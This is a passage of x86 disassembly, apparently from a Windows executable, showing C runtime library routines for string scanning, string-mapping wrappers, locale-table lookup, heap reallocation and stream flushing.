  4078c9:	50                   	push   %eax
  4078ca:	50                   	push   %eax
  4078cb:	50                   	push   %eax
  4078cc:	50                   	push   %eax
  4078cd:	50                   	push   %eax
  4078ce:	8b 55 0c             	mov    0xc(%ebp),%edx
  4078d1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4078d4:	8a 02                	mov    (%edx),%al
  4078d6:	0a c0                	or     %al,%al
  4078d8:	74 09                	je     0x4078e3
  4078da:	83 c2 01             	add    $0x1,%edx
  4078dd:	0f ab 04 24          	bts    %eax,(%esp)
  4078e1:	eb f1                	jmp    0x4078d4
  4078e3:	8b 75 08             	mov    0x8(%ebp),%esi
  4078e6:	8b ff                	mov    %edi,%edi
  4078e8:	8a 06                	mov    (%esi),%al
  4078ea:	0a c0                	or     %al,%al
  4078ec:	74 0c                	je     0x4078fa
  4078ee:	83 c6 01             	add    $0x1,%esi
  4078f1:	0f a3 04 24          	bt     %eax,(%esp)
  4078f5:	73 f1                	jae    0x4078e8
  4078f7:	8d 46 ff             	lea    -0x1(%esi),%eax
  4078fa:	83 c4 20             	add    $0x20,%esp
  4078fd:	5e                   	pop    %esi
  4078fe:	c9                   	leave
  4078ff:	c3                   	ret
  407900:	e8 48 d9 ff ff       	call   0x40524d
  407905:	33 c9                	xor    %ecx,%ecx
  407907:	84 c0                	test   %al,%al
  407909:	0f 94 c1             	sete   %cl
  40790c:	8b c1                	mov    %ecx,%eax
  40790e:	c3                   	ret
  40790f:	8b ff                	mov    %edi,%edi
  407911:	55                   	push   %ebp
  407912:	8b ec                	mov    %esp,%ebp
  407914:	51                   	push   %ecx
  407915:	51                   	push   %ecx
  407916:	a1 04 30 41 00       	mov    0x413004,%eax
  40791b:	33 c5                	xor    %ebp,%eax
  40791d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407920:	53                   	push   %ebx
  407921:	56                   	push   %esi
  407922:	8b 75 18             	mov    0x18(%ebp),%esi
  407925:	57                   	push   %edi
  407926:	85 f6                	test   %esi,%esi
  407928:	7e 14                	jle    0x40793e
  40792a:	56                   	push   %esi
  40792b:	ff 75 14             	push   0x14(%ebp)
  40792e:	e8 e5 07 00 00       	call   0x408118
  407933:	59                   	pop    %ecx
  407934:	3b c6                	cmp    %esi,%eax
  407936:	59                   	pop    %ecx
  407937:	8d 70 01             	lea    0x1(%eax),%esi
  40793a:	7c 02                	jl     0x40793e
  40793c:	8b f0                	mov    %eax,%esi
  40793e:	8b 7d 24             	mov    0x24(%ebp),%edi
  407941:	85 ff                	test   %edi,%edi
  407943:	75 0b                	jne    0x407950
  407945:	8b 45 08             	mov    0x8(%ebp),%eax
  407948:	8b 00                	mov    (%eax),%eax
  40794a:	8b 78 08             	mov    0x8(%eax),%edi
  40794d:	89 7d 24             	mov    %edi,0x24(%ebp)
  407950:	33 c0                	xor    %eax,%eax
  407952:	39 45 28             	cmp    %eax,0x28(%ebp)
  407955:	6a 00                	push   $0x0
  407957:	6a 00                	push   $0x0
  407959:	56                   	push   %esi
  40795a:	ff 75 14             	push   0x14(%ebp)
  40795d:	0f 95 c0             	setne  %al
  407960:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  407967:	50                   	push   %eax
  407968:	57                   	push   %edi
  407969:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  40796f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407972:	85 c0                	test   %eax,%eax
  407974:	0f 84 8d 01 00 00    	je     0x407b07
  40797a:	8d 14 00             	lea    (%eax,%eax,1),%edx
  40797d:	8d 4a 08             	lea    0x8(%edx),%ecx
  407980:	3b d1                	cmp    %ecx,%edx
  407982:	1b c0                	sbb    %eax,%eax
  407984:	85 c1                	test   %eax,%ecx
  407986:	74 52                	je     0x4079da
  407988:	8d 4a 08             	lea    0x8(%edx),%ecx
  40798b:	3b d1                	cmp    %ecx,%edx
  40798d:	1b c0                	sbb    %eax,%eax
  40798f:	23 c1                	and    %ecx,%eax
  407991:	8d 4a 08             	lea    0x8(%edx),%ecx
  407994:	3d 00 04 00 00       	cmp    $0x400,%eax
  407999:	77 1d                	ja     0x4079b8
  40799b:	3b d1                	cmp    %ecx,%edx
  40799d:	1b c0                	sbb    %eax,%eax
  40799f:	23 c1                	and    %ecx,%eax
  4079a1:	e8 aa 31 00 00       	call   0x40ab50
  4079a6:	8b dc                	mov    %esp,%ebx
  4079a8:	85 db                	test   %ebx,%ebx
  4079aa:	0f 84 4c 01 00 00    	je     0x407afc
  4079b0:	c7 03 cc cc 00 00    	movl   $0xcccc,(%ebx)
  4079b6:	eb 1d                	jmp    0x4079d5
  4079b8:	3b d1                	cmp    %ecx,%edx
  4079ba:	1b c0                	sbb    %eax,%eax
  4079bc:	23 c1                	and    %ecx,%eax
  4079be:	50                   	push   %eax
  4079bf:	e8 83 c4 ff ff       	call   0x403e47
  4079c4:	8b d8                	mov    %eax,%ebx
  4079c6:	59                   	pop    %ecx
  4079c7:	85 db                	test   %ebx,%ebx
  4079c9:	0f 84 2d 01 00 00    	je     0x407afc
  4079cf:	c7 03 dd dd 00 00    	movl   $0xdddd,(%ebx)
  4079d5:	83 c3 08             	add    $0x8,%ebx
  4079d8:	eb 02                	jmp    0x4079dc
  4079da:	33 db                	xor    %ebx,%ebx
  4079dc:	85 db                	test   %ebx,%ebx
  4079de:	0f 84 18 01 00 00    	je     0x407afc
  4079e4:	ff 75 f8             	push   -0x8(%ebp)
  4079e7:	53                   	push   %ebx
  4079e8:	56                   	push   %esi
  4079e9:	ff 75 14             	push   0x14(%ebp)
  4079ec:	6a 01                	push   $0x1
  4079ee:	57                   	push   %edi
  4079ef:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  4079f5:	85 c0                	test   %eax,%eax
  4079f7:	0f 84 ff 00 00 00    	je     0x407afc
  4079fd:	8b 7d f8             	mov    -0x8(%ebp),%edi
  407a00:	33 c0                	xor    %eax,%eax
  407a02:	50                   	push   %eax
  407a03:	50                   	push   %eax
  407a04:	50                   	push   %eax
  407a05:	50                   	push   %eax
  407a06:	50                   	push   %eax
  407a07:	57                   	push   %edi
  407a08:	53                   	push   %ebx
  407a09:	ff 75 10             	push   0x10(%ebp)
  407a0c:	ff 75 0c             	push   0xc(%ebp)
  407a0f:	e8 7f df ff ff       	call   0x405993
  407a14:	8b f0                	mov    %eax,%esi
  407a16:	85 f6                	test   %esi,%esi
  407a18:	0f 84 de 00 00 00    	je     0x407afc
  407a1e:	f7 45 10 00 04 00 00 	testl  $0x400,0x10(%ebp)
  407a25:	74 38                	je     0x407a5f
  407a27:	8b 45 20             	mov    0x20(%ebp),%eax
  407a2a:	85 c0                	test   %eax,%eax
  407a2c:	0f 84 cc 00 00 00    	je     0x407afe
  407a32:	3b f0                	cmp    %eax,%esi
  407a34:	0f 8f c2 00 00 00    	jg     0x407afc
  407a3a:	33 c9                	xor    %ecx,%ecx
  407a3c:	51                   	push   %ecx
  407a3d:	51                   	push   %ecx
  407a3e:	51                   	push   %ecx
  407a3f:	50                   	push   %eax
  407a40:	ff 75 1c             	push   0x1c(%ebp)
  407a43:	57                   	push   %edi
  407a44:	53                   	push   %ebx
  407a45:	ff 75 10             	push   0x10(%ebp)
  407a48:	ff 75 0c             	push   0xc(%ebp)
  407a4b:	e8 43 df ff ff       	call   0x405993
  407a50:	8b f0                	mov    %eax,%esi
  407a52:	85 f6                	test   %esi,%esi
  407a54:	0f 85 a4 00 00 00    	jne    0x407afe
  407a5a:	e9 9d 00 00 00       	jmp    0x407afc
  407a5f:	8d 14 36             	lea    (%esi,%esi,1),%edx
  407a62:	8d 4a 08             	lea    0x8(%edx),%ecx
  407a65:	3b d1                	cmp    %ecx,%edx
  407a67:	1b c0                	sbb    %eax,%eax
  407a69:	85 c1                	test   %eax,%ecx
  407a6b:	74 4a                	je     0x407ab7
  407a6d:	8d 4a 08             	lea    0x8(%edx),%ecx
  407a70:	3b d1                	cmp    %ecx,%edx
  407a72:	1b c0                	sbb    %eax,%eax
  407a74:	23 c1                	and    %ecx,%eax
  407a76:	8d 4a 08             	lea    0x8(%edx),%ecx
  407a79:	3d 00 04 00 00       	cmp    $0x400,%eax
  407a7e:	77 19                	ja     0x407a99
  407a80:	3b d1                	cmp    %ecx,%edx
  407a82:	1b c0                	sbb    %eax,%eax
  407a84:	23 c1                	and    %ecx,%eax
  407a86:	e8 c5 30 00 00       	call   0x40ab50
  407a8b:	8b fc                	mov    %esp,%edi
  407a8d:	85 ff                	test   %edi,%edi
  407a8f:	74 64                	je     0x407af5
  407a91:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  407a97:	eb 19                	jmp    0x407ab2
  407a99:	3b d1                	cmp    %ecx,%edx
  407a9b:	1b c0                	sbb    %eax,%eax
  407a9d:	23 c1                	and    %ecx,%eax
  407a9f:	50                   	push   %eax
  407aa0:	e8 a2 c3 ff ff       	call   0x403e47
  407aa5:	8b f8                	mov    %eax,%edi
  407aa7:	59                   	pop    %ecx
  407aa8:	85 ff                	test   %edi,%edi
  407aaa:	74 49                	je     0x407af5
  407aac:	c7 07 dd dd 00 00    	movl   $0xdddd,(%edi)
  407ab2:	83 c7 08             	add    $0x8,%edi
  407ab5:	eb 02                	jmp    0x407ab9
  407ab7:	33 ff                	xor    %edi,%edi
  407ab9:	85 ff                	test   %edi,%edi
  407abb:	74 38                	je     0x407af5
  407abd:	6a 00                	push   $0x0
  407abf:	6a 00                	push   $0x0
  407ac1:	6a 00                	push   $0x0
  407ac3:	56                   	push   %esi
  407ac4:	57                   	push   %edi
  407ac5:	ff 75 f8             	push   -0x8(%ebp)
  407ac8:	53                   	push   %ebx
  407ac9:	ff 75 10             	push   0x10(%ebp)
  407acc:	ff 75 0c             	push   0xc(%ebp)
  407acf:	e8 bf de ff ff       	call   0x405993
  407ad4:	85 c0                	test   %eax,%eax
  407ad6:	74 1d                	je     0x407af5
  407ad8:	33 c0                	xor    %eax,%eax
  407ada:	50                   	push   %eax
  407adb:	50                   	push   %eax
  407adc:	39 45 20             	cmp    %eax,0x20(%ebp)
  407adf:	75 3a                	jne    0x407b1b
  407ae1:	50                   	push   %eax
  407ae2:	50                   	push   %eax
  407ae3:	56                   	push   %esi
  407ae4:	57                   	push   %edi
  407ae5:	50                   	push   %eax
  407ae6:	ff 75 24             	push   0x24(%ebp)
  407ae9:	ff 15 e8 c0 40 00    	call   *0x40c0e8
  407aef:	8b f0                	mov    %eax,%esi
  407af1:	85 f6                	test   %esi,%esi
  407af3:	75 2e                	jne    0x407b23
  407af5:	57                   	push   %edi
  407af6:	e8 e4 e8 ff ff       	call   0x4063df
  407afb:	59                   	pop    %ecx
  407afc:	33 f6                	xor    %esi,%esi
  407afe:	53                   	push   %ebx
  407aff:	e8 db e8 ff ff       	call   0x4063df
  407b04:	59                   	pop    %ecx
  407b05:	8b c6                	mov    %esi,%eax
  407b07:	8d 65 ec             	lea    -0x14(%ebp),%esp
  407b0a:	5f                   	pop    %edi
  407b0b:	5e                   	pop    %esi
  407b0c:	5b                   	pop    %ebx
  407b0d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407b10:	33 cd                	xor    %ebp,%ecx
  407b12:	e8 b1 9c ff ff       	call   0x4017c8
  407b17:	8b e5                	mov    %ebp,%esp
  407b19:	5d                   	pop    %ebp
  407b1a:	c3                   	ret
  407b1b:	ff 75 20             	push   0x20(%ebp)
  407b1e:	ff 75 1c             	push   0x1c(%ebp)
  407b21:	eb c0                	jmp    0x407ae3
  407b23:	57                   	push   %edi
  407b24:	e8 b6 e8 ff ff       	call   0x4063df
  407b29:	59                   	pop    %ecx
  407b2a:	eb d2                	jmp    0x407afe
  407b2c:	8b ff                	mov    %edi,%edi
  407b2e:	55                   	push   %ebp
  407b2f:	8b ec                	mov    %esp,%ebp
  407b31:	83 ec 10             	sub    $0x10,%esp
  407b34:	ff 75 08             	push   0x8(%ebp)
  407b37:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407b3a:	e8 f6 c3 ff ff       	call   0x403f35
  407b3f:	ff 75 28             	push   0x28(%ebp)
  407b42:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407b45:	ff 75 24             	push   0x24(%ebp)
  407b48:	ff 75 20             	push   0x20(%ebp)
  407b4b:	ff 75 1c             	push   0x1c(%ebp)
  407b4e:	ff 75 18             	push   0x18(%ebp)
  407b51:	ff 75 14             	push   0x14(%ebp)
  407b54:	ff 75 10             	push   0x10(%ebp)
  407b57:	ff 75 0c             	push   0xc(%ebp)
  407b5a:	50                   	push   %eax
  407b5b:	e8 af fd ff ff       	call   0x40790f
  407b60:	83 c4 24             	add    $0x24,%esp
  407b63:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  407b67:	74 0a                	je     0x407b73
  407b69:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407b6c:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  407b73:	8b e5                	mov    %ebp,%esp
  407b75:	5d                   	pop    %ebp
  407b76:	c3                   	ret
  407b77:	8b ff                	mov    %edi,%edi
  407b79:	55                   	push   %ebp
  407b7a:	8b ec                	mov    %esp,%ebp
  407b7c:	83 ec 10             	sub    $0x10,%esp
  407b7f:	53                   	push   %ebx
  407b80:	56                   	push   %esi
  407b81:	57                   	push   %edi
  407b82:	33 ff                	xor    %edi,%edi
  407b84:	bb e3 00 00 00       	mov    $0xe3,%ebx
  407b89:	89 7d f4             	mov    %edi,-0xc(%ebp)
  407b8c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407b8f:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  407b92:	c7 45 fc 55 00 00 00 	movl   $0x55,-0x4(%ebp)
  407b99:	99                   	cltd
  407b9a:	2b c2                	sub    %edx,%eax
  407b9c:	8b c8                	mov    %eax,%ecx
  407b9e:	d1 f9                	sar    $1,%ecx
  407ba0:	6a 41                	push   $0x41
  407ba2:	5f                   	pop    %edi
  407ba3:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407ba6:	8b 34 cd 20 ee 40 00 	mov    0x40ee20(,%ecx,8),%esi
  407bad:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407bb0:	6a 5a                	push   $0x5a
  407bb2:	2b ce                	sub    %esi,%ecx
  407bb4:	5b                   	pop    %ebx
  407bb5:	0f b7 04 31          	movzwl (%ecx,%esi,1),%eax
  407bb9:	66 3b c7             	cmp    %di,%ax
  407bbc:	72 0d                	jb     0x407bcb
  407bbe:	66 3b c3             	cmp    %bx,%ax
  407bc1:	77 08                	ja     0x407bcb
  407bc3:	83 c0 20             	add    $0x20,%eax
  407bc6:	0f b7 d0             	movzwl %ax,%edx
  407bc9:	eb 02                	jmp    0x407bcd
  407bcb:	8b d0                	mov    %eax,%edx
  407bcd:	0f b7 06             	movzwl (%esi),%eax
  407bd0:	66 3b c7             	cmp    %di,%ax
  407bd3:	72 0b                	jb     0x407be0
  407bd5:	66 3b c3             	cmp    %bx,%ax
  407bd8:	77 06                	ja     0x407be0
  407bda:	83 c0 20             	add    $0x20,%eax
  407bdd:	0f b7 c0             	movzwl %ax,%eax
  407be0:	83 c6 02             	add    $0x2,%esi
  407be3:	83 6d fc 01          	subl   $0x1,-0x4(%ebp)
  407be7:	74 0a                	je     0x407bf3
  407be9:	66 85 d2             	test   %dx,%dx
  407bec:	74 05                	je     0x407bf3
  407bee:	66 3b d0             	cmp    %ax,%dx
  407bf1:	74 c2                	je     0x407bb5
  407bf3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407bf6:	8b 7d f4             	mov    -0xc(%ebp),%edi
  407bf9:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  407bfc:	0f b7 c0             	movzwl %ax,%eax
  407bff:	0f b7 d2             	movzwl %dx,%edx
  407c02:	2b d0                	sub    %eax,%edx
  407c04:	74 1f                	je     0x407c25
  407c06:	85 d2                	test   %edx,%edx
  407c08:	79 08                	jns    0x407c12
  407c0a:	8d 59 ff             	lea    -0x1(%ecx),%ebx
  407c0d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407c10:	eb 06                	jmp    0x407c18
  407c12:	8d 79 01             	lea    0x1(%ecx),%edi
  407c15:	89 7d f4             	mov    %edi,-0xc(%ebp)
  407c18:	3b fb                	cmp    %ebx,%edi
  407c1a:	0f 8e 6f ff ff ff    	jle    0x407b8f
  407c20:	83 c8 ff             	or     $0xffffffff,%eax
  407c23:	eb 07                	jmp    0x407c2c
  407c25:	8b 04 cd 24 ee 40 00 	mov    0x40ee24(,%ecx,8),%eax
  407c2c:	5f                   	pop    %edi
  407c2d:	5e                   	pop    %esi
  407c2e:	5b                   	pop    %ebx
  407c2f:	8b e5                	mov    %ebp,%esp
  407c31:	5d                   	pop    %ebp
  407c32:	c3                   	ret
  407c33:	8b ff                	mov    %edi,%edi
  407c35:	55                   	push   %ebp
  407c36:	8b ec                	mov    %esp,%ebp
  407c38:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  407c3c:	74 1d                	je     0x407c5b
  407c3e:	ff 75 08             	push   0x8(%ebp)
  407c41:	e8 31 ff ff ff       	call   0x407b77
  407c46:	59                   	pop    %ecx
  407c47:	85 c0                	test   %eax,%eax
  407c49:	78 10                	js     0x407c5b
  407c4b:	3d e4 00 00 00       	cmp    $0xe4,%eax
  407c50:	73 09                	jae    0x407c5b
  407c52:	8b 04 c5 00 dd 40 00 	mov    0x40dd00(,%eax,8),%eax
  407c59:	5d                   	pop    %ebp
  407c5a:	c3                   	ret
  407c5b:	33 c0                	xor    %eax,%eax
  407c5d:	5d                   	pop    %ebp
  407c5e:	c3                   	ret
  407c5f:	8b ff                	mov    %edi,%edi
  407c61:	55                   	push   %ebp
  407c62:	8b ec                	mov    %esp,%ebp
  407c64:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  407c68:	75 15                	jne    0x407c7f
  407c6a:	e8 cc cb ff ff       	call   0x40483b
  407c6f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  407c75:	e8 c9 c9 ff ff       	call   0x404643
  407c7a:	83 c8 ff             	or     $0xffffffff,%eax
  407c7d:	5d                   	pop    %ebp
  407c7e:	c3                   	ret
  407c7f:	ff 75 08             	push   0x8(%ebp)
  407c82:	6a 00                	push   $0x0
  407c84:	ff 35 60 42 41 00    	push   0x414260
  407c8a:	ff 15 34 c1 40 00    	call   *0x40c134
  407c90:	5d                   	pop    %ebp
  407c91:	c3                   	ret
  407c92:	8b ff                	mov    %edi,%edi
  407c94:	55                   	push   %ebp
  407c95:	8b ec                	mov    %esp,%ebp
  407c97:	57                   	push   %edi
  407c98:	8b 7d 08             	mov    0x8(%ebp),%edi
  407c9b:	85 ff                	test   %edi,%edi
  407c9d:	75 0b                	jne    0x407caa
  407c9f:	ff 75 0c             	push   0xc(%ebp)
  407ca2:	e8 a0 c1 ff ff       	call   0x403e47
  407ca7:	59                   	pop    %ecx
  407ca8:	eb 24                	jmp    0x407cce
  407caa:	56                   	push   %esi
  407cab:	8b 75 0c             	mov    0xc(%ebp),%esi
  407cae:	85 f6                	test   %esi,%esi
  407cb0:	75 09                	jne    0x407cbb
  407cb2:	57                   	push   %edi
  407cb3:	e8 55 c1 ff ff       	call   0x403e0d
  407cb8:	59                   	pop    %ecx
  407cb9:	eb 10                	jmp    0x407ccb
  407cbb:	83 fe e0             	cmp    $0xffffffe0,%esi
  407cbe:	76 25                	jbe    0x407ce5
  407cc0:	e8 76 cb ff ff       	call   0x40483b
  407cc5:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407ccb:	33 c0                	xor    %eax,%eax
  407ccd:	5e                   	pop    %esi
  407cce:	5f                   	pop    %edi
  407ccf:	5d                   	pop    %ebp
  407cd0:	c3                   	ret
  407cd1:	e8 43 bb ff ff       	call   0x403819
  407cd6:	85 c0                	test   %eax,%eax
  407cd8:	74 e6                	je     0x407cc0
  407cda:	56                   	push   %esi
  407cdb:	e8 58 ec ff ff       	call   0x406938
  407ce0:	59                   	pop    %ecx
  407ce1:	85 c0                	test   %eax,%eax
  407ce3:	74 db                	je     0x407cc0
  407ce5:	56                   	push   %esi
  407ce6:	57                   	push   %edi
  407ce7:	6a 00                	push   $0x0
  407ce9:	ff 35 60 42 41 00    	push   0x414260
  407cef:	ff 15 38 c1 40 00    	call   *0x40c138
  407cf5:	85 c0                	test   %eax,%eax
  407cf7:	74 d8                	je     0x407cd1
  407cf9:	eb d2                	jmp    0x407ccd
  407cfb:	8b ff                	mov    %edi,%edi
  407cfd:	55                   	push   %ebp
  407cfe:	8b ec                	mov    %esp,%ebp
  407d00:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407d03:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  407d06:	75 0d                	jne    0x407d15
  407d08:	e8 2e cb ff ff       	call   0x40483b
  407d0d:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  407d13:	eb 38                	jmp    0x407d4d
  407d15:	85 c9                	test   %ecx,%ecx
  407d17:	78 24                	js     0x407d3d
  407d19:	3b 0d 50 42 41 00    	cmp    0x414250,%ecx
  407d1f:	73 1c                	jae    0x407d3d
  407d21:	8b c1                	mov    %ecx,%eax
  407d23:	83 e1 3f             	and    $0x3f,%ecx
  407d26:	c1 f8 06             	sar    $0x6,%eax
  407d29:	6b c9 30             	imul   $0x30,%ecx,%ecx
  407d2c:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  407d33:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
  407d38:	83 e0 40             	and    $0x40,%eax
  407d3b:	5d                   	pop    %ebp
  407d3c:	c3                   	ret
  407d3d:	e8 f9 ca ff ff       	call   0x40483b
  407d42:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  407d48:	e8 f6 c8 ff ff       	call   0x404643
  407d4d:	33 c0                	xor    %eax,%eax
  407d4f:	5d                   	pop    %ebp
  407d50:	c3                   	ret
  407d51:	8b ff                	mov    %edi,%edi
  407d53:	55                   	push   %ebp
  407d54:	8b ec                	mov    %esp,%ebp
  407d56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407d59:	56                   	push   %esi
  407d5a:	8d 71 0c             	lea    0xc(%ecx),%esi
  407d5d:	8b 06                	mov    (%esi),%eax
  407d5f:	24 03                	and    $0x3,%al
  407d61:	3c 02                	cmp    $0x2,%al
  407d63:	74 04                	je     0x407d69
  407d65:	33 c0                	xor    %eax,%eax
  407d67:	eb 4b                	jmp    0x407db4
  407d69:	8b 06                	mov    (%esi),%eax
  407d6b:	a8 c0                	test   $0xc0,%al
  407d6d:	74 f6                	je     0x407d65
  407d6f:	8b 41 04             	mov    0x4(%ecx),%eax
  407d72:	57                   	push   %edi
  407d73:	8b 39                	mov    (%ecx),%edi
  407d75:	2b f8                	sub    %eax,%edi
  407d77:	89 01                	mov    %eax,(%ecx)
  407d79:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  407d7d:	85 ff                	test   %edi,%edi
  407d7f:	7e 30                	jle    0x407db1
  407d81:	57                   	push   %edi
  407d82:	50                   	push   %eax
  407d83:	51                   	push   %ecx
  407d84:	e8 48 f5 ff ff       	call   0x4072d1
  407d89:	59                   	pop    %ecx
  407d8a:	50                   	push   %eax
  407d8b:	e8 63 0a 00 00       	call   0x4087f3
  407d90:	83 c4 0c             	add    $0xc,%esp
  407d93:	3b f8                	cmp    %eax,%edi
  407d95:	74 0b                	je     0x407da2
  407d97:	6a 10                	push   $0x10
  407d99:	58                   	pop    %eax
  407d9a:	f0 09 06             	lock or %eax,(%esi)
  407d9d:	83 c8 ff             	or     $0xffffffff,%eax
  407da0:	eb 11                	jmp    0x407db3
  407da2:	8b 06                	mov    (%esi),%eax
  407da4:	c1 e8 02             	shr    $0x2,%eax
  407da7:	a8 01                	test   $0x1,%al
  407da9:	74 06                	je     0x407db1
  407dab:	6a fd                	push   $0xfffffffd
  407dad:	58                   	pop    %eax
  407dae:	f0 21 06             	lock and %eax,(%esi)
  407db1:	33 c0                	xor    %eax,%eax
  407db3:	5f                   	pop    %edi
  407db4:	5e                   	pop    %esi
  407db5:	5d                   	pop    %ebp
  407db6:	c3                   	ret
  407db7:	8b ff                	mov    %edi,%edi
  407db9:	55                   	push   %ebp
  407dba:	8b ec                	mov    %esp,%ebp
  407dbc:	56                   	push   %esi
  407dbd:	8b 75 08             	mov    0x8(%ebp),%esi
  407dc0:	85 f6                	test   %esi,%esi
  407dc2:	75 09                	jne    0x407dcd
  407dc4:	56                   	push   %esi
  407dc5:	e8 3d 00 00 00       	call   0x407e07
  407dca:	59                   	pop    %ecx
  407dcb:	eb 2e                	jmp    0x407dfb
  407dcd:	56                   	push   %esi
  407dce:	e8 7e ff ff ff       	call   0x407d51
  407dd3:	59                   	pop    %ecx
  407dd4:	85 c0                	test   %eax,%eax
  407dd6:	74 05                	je     0x407ddd
  407dd8:	83 c8 ff             	or     $0xffffffff,%eax
  407ddb:	eb 1e                	jmp    0x407dfb
  407ddd:	8b 46 0c             	mov    0xc(%esi),%eax
  407de0:	c1 e8 0b             	shr    $0xb,%eax
  407de3:	a8 01                	test   $0x1,%al
  407de5:	74 12                	je     0x407df9
  407de7:	56                   	push   %esi
  407de8:	e8 e4 f4 ff ff       	call   0x4072d1
  407ded:	50                   	push   %eax
  407dee:	e8 01 04 00 00       	call   0x4081f4
  407df3:	59                   	pop    %ecx
  407df4:	59                   	pop    %ecx
  407df5:	85 c0                	test   %eax,%eax
  407df7:	75 df                	jne    0x407dd8
  407df9:	33 c0                	xor    %eax,%eax
  407dfb:	5e                   	pop    %esi
  407dfc:	5d                   	pop    %ebp
  407dfd:	c3                   	ret
  407dfe:	6a 01                	push   $0x1
  407e00:	e8 02 00 00 00       	call   0x407e07
  407e05:	59                   	pop    %ecx
  407e06:	c3                   	ret
  407e07:	6a 1c                	push   $0x1c
  407e09:	68 48 19 41 00       	push   $0x411948
  407e0e:	e8 fd a2 ff ff       	call   0x402110
  407e13:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  407e17:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  407e1b:	6a 08                	push   $0x8
  407e1d:	e8 3e d8 ff ff       	call   0x405660
  407e22:	59                   	pop    %ecx
  407e23:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407e27:	8b 35 84 42 41 00    	mov    0x414284,%esi
  407e2d:	a1 80 42 41 00       	mov    0x414280,%eax
  407e32:	8d 04 86             	lea    (%esi,%eax,4),%eax
  407e35:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407e38:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407e3b:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407e3e:	3b f0                	cmp    %eax,%esi
  407e40:	74 74                	je     0x407eb6
  407e42:	8b 3e                	mov    (%esi),%edi
  407e44:	89 7d d8             	mov    %edi,-0x28(%ebp)
  407e47:	85 ff                	test   %edi,%edi
  407e49:	74 56                	je     0x407ea1
  407e4b:	57                   	push   %edi
  407e4c:	e8 ba f5 ff ff       	call   0x40740b
  407e51:	59                   	pop    %ecx
  407e52:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407e59:	8b 47 0c             	mov    0xc(%edi),%eax
  407e5c:	c1 e8 0d             	shr    $0xd,%eax
  407e5f:	a8 01                	test   $0x1,%al
  407e61:	74 32                	je     0x407e95
  407e63:	83 fb 01             	cmp    $0x1,%ebx
  407e66:	75 11                	jne    0x407e79
  407e68:	57                   	push   %edi
  407e69:	e8 49 ff ff ff       	call   0x407db7
  407e6e:	59                   	pop    %ecx
  407e6f:	83 f8 ff             	cmp    $0xffffffff,%eax
  407e72:	74 21                	je     0x407e95
  407e74:	ff 45 e4             	incl   -0x1c(%ebp)
  407e77:	eb 1c                	jmp    0x407e95
  407e79:	85 db                	test   %ebx,%ebx
  407e7b:	75 18                	jne    0x407e95
  407e7d:	8b 47 0c             	mov    0xc(%edi),%eax
  407e80:	d1 e8                	shr    $1,%eax
  407e82:	a8 01                	test   $0x1,%al
  407e84:	74 0f                	je     0x407e95
  407e86:	57                   	push   %edi
  407e87:	e8 2b ff ff ff       	call   0x407db7
  407e8c:	59                   	pop    %ecx
  407e8d:	83 f8 ff             	cmp    $0xffffffff,%eax
  407e90:	75 03                	jne    0x407e95
  407e92:	09 45 dc             	or     %eax,-0x24(%ebp)
  407e95:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407e99:	e8 0e 00 00 00       	call   0x407eac
  407e9e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407ea1:	83 c6 04             	add    $0x4,%esi
  407ea4:	eb 95                	jmp    0x407e3b
  407ea6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407ea9:	8b 75 e0             	mov    -0x20(%ebp),%esi
  407eac:	ff 75 d8             	push   -0x28(%ebp)
  407eaf:	e8 6b f5 ff ff       	call   0x40741f
  407eb4:	59                   	pop    %ecx
  407eb5:	c3                   	ret
  407eb6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407ebd:	e8 14 00 00 00       	call   0x407ed6
  407ec2:	83 fb 01             	cmp    $0x1,%ebx
  407ec5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407ec8:	74 03                	je     0x407ecd
  407eca:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407ecd:	e8 84 a2 ff ff       	call   0x402156
  407ed2:	c3                   	ret
  407ed3:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407ed6:	6a 08                	push   $0x8
  407ed8:	e8 cb d7 ff ff       	call   0x4056a8
  407edd:	59                   	pop    %ecx
  407ede:	c3                   	ret
  407edf:	6a 08                	push   $0x8
  407ee1:	68 70 19 41 00       	push   $0x411970
